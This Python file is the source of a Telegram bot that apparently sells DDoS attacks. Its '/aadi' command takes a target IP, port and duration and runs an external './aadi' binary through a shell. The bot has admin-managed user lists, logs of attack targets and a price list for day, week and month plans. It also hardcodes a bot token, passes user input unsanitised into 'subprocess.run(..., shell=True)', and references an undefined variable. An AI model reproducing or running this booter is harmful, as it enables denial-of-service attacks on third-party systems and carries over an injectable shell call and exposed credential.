#aadiddoserpython

import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7324603047:AAGq8qfsYAB2_-6A7ZoKxB57_td0ofrKDn0')

# Admin user IDs
admin_id = {"1302320722", "", ""}


USER_FILE = "users.txt"
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "ʟᴏɢ ᴄʟᴇᴀʀᴇᴅ ᴀʟʀᴇᴀᴅʏ☑️."
            else:
                file.truncate(0)
                response = "ᴄʟᴇᴀʀᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ☑️ "
    except FileNotFoundError:
        response = "ɴᴏ ʟᴏɢs❎."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"ᴜsᴇʀ {user_to_add} ᴀᴅᴅᴇss sᴜᴄᴄᴇssғᴜʟʟʏ ☑️."
            else:
                response = "ᴜsᴇʀ ᴀʟʀᴇᴀᴅʏ ɪɴ ʙᴏᴛ✔️."
        else:
            response = "ᴇɴᴛᴇʀ ɴᴇᴡ ᴜsᴇʀ ɪᴅ🗿."
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ ❗."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"ᴜsᴇʀ {user_to_remove} ʀᴇᴍᴏᴠᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ☑️."
            else:
                response = f"ᴜsᴇʀ {user_to_remove} ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ʟɪsᴛ🔴."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ❗."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "😎🇲 🇪  🇰 🇷  🇩 🇺 🇳 🇬 🇦  🇹 🇺 🇲  🇧 🇸  🇰 🇭 🇪 🇱 😎"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "T̊⫶Ů⫶ Å⫶P̊⫶N̊⫶Å⫶ D̊⫶E̊⫶K̊⫶H̊⫶ N̊⫶Å⫶ B̊⫶H̊⫶Å⫶I̊⫶"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /aadi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f" 🚀𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧🥶\n🎯𝐈𝐏:{target} \n⛱️️𝙋𝙤𝙧𝙩:{port} \n⌚𝐓𝐢ᴍᴇ:{time}\n᚛ https://t.me/user_x_dead ᚜"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /aadi command
aadi_cooldown = {}

COOLDOWN_TIME = 0 #  seconds cooldown time

# Handler for /aadi command
@bot.message_handler(commands=['aadi'])
def handle_aadi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in aadi_cooldown and (datetime.datetime.now() - aadi_cooldown[user_id]).seconds < 10:
                response = "ᴄᴏᴏʟᴅᴏᴡɴ ᴏɴ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ¼ ᴍɪɴᴜᴛᴇ ᴀɴᴅ ᴜsᴇ ᴀɢᴀɪɴ /aadi ᴄᴏᴍᴍᴀɴᴅ❗\nhttps://t.me/user_x_dead "
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            aadi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 201:
                response = "ᴇʀʀᴏʀ: ᴍᴀx ᴀᴛᴛᴀᴄᴋ sᴇᴄᴏɴᴅ 200sᴇᴄ ❌."
            else:
                record_command_logs(user_id, '/aadi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./aadi {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \n💘ᴄᴏᴍᴘʟᴇᴛᴇ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ🔊️\n https://t.me/user_x_dead"
        else:
            response = "ᴜsᴀɢᴇ✅ :- /aadi <target> <port> <time>\nhttps://t.me/user_x_dead "  # Updated command syntax


    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ 🤬"


    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for aadi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"ᴜsᴇʀ ɪᴅ: {user_id}" in log]
                if user_logs:
                    response = "ʏᴏᴜʀ ᴄᴏᴍᴍᴀɴᴅ:\n" + "".join(user_logs)
                else:
                    response = "ɴᴏ ʟᴏɢs."
        except FileNotFoundError:
            response = "ɴᴏ ʟᴏɢ ғᴏᴜɴᴅ."
    else:
        response = "ɴᴏ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅ🐒
 /aadi : ғᴏʀ ᴅᴅᴏs 😈. 
 /rules : ʀᴇᴀᴅ ᴄᴀʀᴇғᴜʟʟʏ🦁.
 /mylogs : ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋ🐎.
 /plan : ʙᴜʏ ғʀᴏᴍ ᴀᴅᴍɪɴ ✓\n

 To See Admin Commands:
 /admincmd : ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ 😎.
 '''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"ᴍᴏsᴛ ᴡᴇʟᴄᴏᴍᴇ ɪɴ ᴘʀɪᴠᴀᴛᴇ ᴅᴅᴏs ᴜsᴇʀ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ➡️: /help \n\nhttps://t.me/user_x_dead"
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} ғᴏʟʟᴏᴡ ᴛʜɪs ʀᴜʟᴇs⚠️:

ᴏɴʟʏ ᴏɴᴇ ʀᴜʟᴇ ᴅᴏ ɴᴏᴛ sᴘᴀᴍ '''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ʙᴜʏ ғʀᴏᴍ https://t.me/user_x_dead

Vip :
-> Attack Time : 500 sᴇᴄ
> After Attack Limit :  ᴏɴᴇ ᴍɪɴᴜᴛᴇ
-> Concurrents Attack : 10

ᴘʀɪᴄᴇ ʟɪsᴛ :-\n
ᴏɴᴇ ᴅᴀʏ :-100ʀs
ᴏɴᴇ ᴡᴇᴀᴋ :- 500
ᴏɴᴇ ᴍᴏɴᴛʜ :- 1500'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : ᴀᴅᴅ ɴᴇᴡ ᴜsᴇʀ.
/remove <userid> : ʀᴇᴍᴏᴠᴇ ᴜsᴇʀ
/allusers : ᴀᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀ ʟɪsᴛ.
/logs : ᴀʟʟ ᴜsᴇʀ ʟᴏɢs.
/clearlogs : ᴄʟᴇᴀʀ ʟᴏɢ ғɪʟᴇ.
/setexpire : sᴇᴛ ᴜsᴇʀ ᴛɪᴍᴇ
https://t.me/user_x_dead
'''
    bot.reply_to(message, response)


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
